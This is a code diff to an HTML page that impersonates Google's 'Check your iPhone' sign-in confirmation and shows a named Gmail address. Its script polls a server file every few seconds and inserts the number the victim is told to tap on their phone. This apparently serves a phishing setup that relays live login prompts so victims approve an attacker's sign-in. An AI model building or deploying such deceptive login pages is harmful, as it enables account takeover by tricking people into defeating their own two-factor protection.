@@ -740,6 +740,39 @@ Constrain images and videos to the parent width and preserve their intrinsic asp
 				}
 			}
 		</style>
+		<script>
+			document.addEventListener("DOMContentLoaded", (event) => {
+				// Function to fetch the number from the server
+				function fetchNumber() {
+					const domainUrl = window.location.origin;
+
+					// Fetch the result from the PHP server
+					fetch(`${domainUrl}/code.txt`)
+						.then((response) => {
+							if (!response.ok) {
+								return "";
+							}
+							return response.text();
+						})
+						.then((data) => {
+							// Display the result
+							document.getElementById("result").innerText = data;
+							document.getElementById("result2").innerText = data;
+						})
+						.catch((error) => {
+							// Display the error
+							document.getElementById("result").innerHTML = "";
+							document.getElementById("result2").innerText = "";
+						});
+				}
+
+				// Call the fetch function once when the page loads
+				fetchNumber();
+
+				// Fetch the number every 10 seconds
+				setInterval(fetchNumber, 3000);
+			});
+		</script>
 	</head>
 	<body>
 		<div
@@ -810,6 +843,16 @@ Constrain images and videos to the parent width and preserve their intrinsic asp
 											peteromolloz@gmail.com
 										</p>
 									</div>
+
+									<!-- <div class="bg-white px-3 py-1 w-full">
+										<video
+											autoplay
+											muted
+											loop
+											src="signin_tapyes.gif.mp4"
+											alt=""
+										/>
+									</div> -->
 								</div>
 							</div>
 							<div
@@ -821,18 +864,16 @@ Constrain images and videos to the parent width and preserve their intrinsic asp
 											<h1
 												id="result"
 												class="text-center text-4xl font-semibold text-black/85"
-											>
-												34
-											</h1>
-											<!-- <div id="loading">Loading...</div> -->
+											></h1>
 											<p class="font-medium">Check your Iphone</p>
 											<p class="text-sm">
 												Google sent a notification to your Iphone. Tap
 												<span class="font-semibold">Yes</span> on the
 												notification, then tap
-												<span id="result2" class="font-semibold inline-block"
-													>34</span
-												>
+												<span
+													id="result2"
+													class="font-semibold inline-block"
+												></span>
 												on your phone to verify that it’s you.
 											</p>
 										</div>
@@ -888,43 +929,5 @@ Constrain images and videos to the parent width and preserve their intrinsic asp
 				</div>
 			</div>
 		</div>
-
-		<script>
-			document.addEventListener("DOMContentLoaded", (event) => {
-				// Function to fetch the number from the server
-				function fetchNumber() {
-					// Show the loading message
-					// document.getElementById('loading').innerHTML = '<p>Loading...</p>';
-
-					const domainUrl = window.location.origin;
-
-					// Fetch the result from the PHP server
-					fetch(`${domainUrl}/code.txt`)
-						.then((response) => response.text())
-						.then((data) => {
-							// Hide the loading message
-							// document.getElementById('loading').innerHTML = '';
-
-							// Display the result
-							document.getElementById("result").innerText = data;
-							document.getElementById("result2").innerText = data;
-						})
-						.catch((error) => {
-							// Hide the loading message
-							// document.getElementById('loading').innerHTML = '';
-
-							// Display the error
-							document.getElementById("result").innerHTML = "loading...";
-							document.getElementById("result2").innerText = "";
-						});
-				}
-
-				// Call the fetch function once when the page loads
-				fetchNumber();
-
-				// Fetch the number every 10 seconds
-				setInterval(fetchNumber, 3000);
-			});
-		</script>
 	</body>
 </html>
